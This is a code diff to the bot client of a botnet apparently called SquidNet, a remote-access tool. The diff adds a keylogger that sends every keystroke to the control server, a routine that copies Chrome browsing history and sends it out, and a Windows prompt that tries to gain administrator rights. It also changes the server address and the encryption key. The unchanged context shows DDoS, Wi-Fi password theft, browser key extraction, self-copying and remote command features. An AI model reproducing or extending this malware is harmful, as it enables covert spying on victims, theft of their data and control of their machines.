@@ -1,9 +1,14 @@
 """
 THIS IS EXAMPLE CODE FOR THE BOT SCRIPT.
 """
+
 #-----SquidNet-Bot-Script-----#
-import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
-import subprocess, re
+import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json, subprocess, re, shutil, ctypes
+from datetime import datetime, timedelta
+try:
+    from pynput.keyboard import Listener # pip install pynput
+except:
+    pass
 try:
     import win32crypt # pip install pypiwin32
 except:
@@ -16,8 +21,6 @@ try:
     from Crypto.Cipher import AES # pip install pycryptodome
 except:
     pass
-import shutil
-
 class DDoS:
     def __init__(self, ip, delay):
         self.ip = ip
@@ -3350,7 +3353,14 @@ class Bot:
         self.ip = ip
         self.port = port
         self.msg = ""
-        self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
+        self.name = os.popen("whoami").read().strip()
+        if sys.platform == "win32":
+            self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
+        elif sys.platform == "darwin":
+            self.desktop = f"/Users/{self.name}/Desktop"
+        else:
+            self.desktop = f"/"
+        self.logging = False
         self.file_saving = False
         while True:
             try:
@@ -3360,6 +3370,11 @@ class Bot:
             except:
                 self.connection.close()
                 time.sleep(1)
+        try:
+            logger = threading.Thread(target=self.start_logging)
+            logger.start()
+        except:
+            pass
         self.fileeditor = False
         time.sleep(1)
         msg = socket.gethostname()+" "+self.getip()+" "+os.getlogin()+" "+sys.platform
@@ -3405,6 +3420,20 @@ class Bot:
                 self.run_cmd()
             except:
                 pass
+    def on_press(self, key):
+        if self.logging:
+            try:
+                self.send("!sendkey " + str(key))
+            except:
+                pass
+    def on_release(self, key):
+        pass
+    def start_logging(self):
+        try:
+            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+                listener.join()
+        except:
+            pass
     def obtainwifipass(self):
         if sys.platform == "darwin":
             self.send("This bot is on a Apple-based product. Unable to get wifi passwords!")
@@ -3494,6 +3523,7 @@ OS:       {sys.platform}
             content = file.read()
             file.close()
             self.send(content)
+            time.sleep(5)
             self.send("finished".encode())
         except:
             pass
@@ -3579,6 +3609,11 @@ OS:       {sys.platform}
                         break
                     except:
                         pass
+                    try:
+                        logger = threading.Thread(target=self.start_logging)
+                        logger.start()
+                    except:
+                        pass
 
     def get_encryption_key(self):
         local_state_path = os.path.join(os.environ["USERPROFILE"],
@@ -3635,7 +3670,7 @@ OS:       {sys.platform}
             os.system(f'start {website}')
         else:
             os.system(f'open {website}')
-    
+
     def clone(self):
         file_ending = sys.argv[0].split(".")
         file_ending = file_ending[len(file_ending) - 1]
@@ -3660,7 +3695,7 @@ OS:       {sys.platform}
         if sys.platform == "win32":
             main_dir = f"C:/Users/{os.getlogin()}/"
         else:
-            main_dir = f"/Users/{sys.argv[0].split('/')[1]}/"
+            main_dir = f"/Users/{self.name}/"
         os.chdir(main_dir)
         workingdirs = []
         workingdirs.append(main_dir)
@@ -3710,6 +3745,28 @@ OS:       {sys.platform}
             os.system(f'start {website}')
         else:
             os.system(f'open {website}')
+    def send_history(self):
+        dirs = os.getcwd()
+        if sys.platform == "win32":
+            os.chdir(f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/")
+        elif sys.platform == "darwin":
+            os.chdir(f"/Users/{self.name}/Library/Application Support/Google/Chrome/User Data/Default/")
+        shutil.copyfile("History", dirs + "/History.db")
+        os.chdir(dirs)
+        History = sqlite3.connect("History.db")
+        cursor = History.cursor()
+        e = cursor.execute("SELECT last_visit_time, visit_count, title, url from urls")
+        for i in cursor.fetchall():
+            time = i[0]
+            visit_count = i[1]
+            url = i[3]
+            title = i[2]
+            epoch = datetime(1601, 1, 1)
+            url_time = epoch + timedelta(microseconds=time)
+            self.send(f"({url_time}) ({visit_count}) ({title}) ({url})".encode())
+        cursor.close()
+        History.close()
+        os.remove("History.db")
     def run_cmd(self):
         try:
             if self.fileeditor:
@@ -3783,6 +3840,16 @@ OS:       {sys.platform}
                     self.send(msgtoserv)
                 elif self.msg.startswith('!getip'):
                     self.send(self.getip())
+                elif self.msg.startswith("!keylog"):
+                    if self.logging:
+                        pass
+                    else:
+                        self.send("Started to send keyboard inputs.")
+                        self.logging = True
+                elif self.msg.startswith("!stopkeylog"):
+                    if self.logging:
+                        self.send("Stopped Keylogging.")
+                    self.logging = False
                 elif self.msg.startswith('!getwifi'):
                     wifi_passwords = self.obtainwifipass()
                     self.send(wifi_passwords)
@@ -3792,6 +3859,8 @@ OS:       {sys.platform}
                 elif self.msg.startswith('!viewfilecontent'):
                     file = self.returnsecondstr(self.msg)
                     self.file_content(file)
+                elif self.msg.startswith("!getchromehistory"):
+                    self.send_history()
                 elif self.msg.startswith('!mkdir'):
                     main_msg = self.msg.split()
                     dirname = main_msg[1]
@@ -3886,9 +3955,23 @@ OS:       {sys.platform}
                     self.send(stdout)
         except Exception as e:
             self.send(f"Error in script: {e}".encode())
-ip = 'localhost'
+ip = '192.168.0.145'
 port = 80
-key = b'QAYEFKLQT469LdHWIs4ZG7xKrDr8JRzMTwNFvoQFILg='
-bot = Bot(ip, port, key)
+key = b'tMFrNEZlqJR8m3GSZ_aHpkDGZefhzK5LK4wFiBC8hn0='
+if sys.platform == "win32":
+    try:
+        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        isadmin = False
+    if isadmin:
+        bot = Bot(ip, port, key)
+    else:
+        exec_dir = sys.argv[0]
+        params = f'"{exec_dir}"'
+        try:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        except:
+            bot = Bot(ip, port, key)
+else:
+    bot = Bot(ip, port, key)
 #-----End-Of-Bot-----#
-        
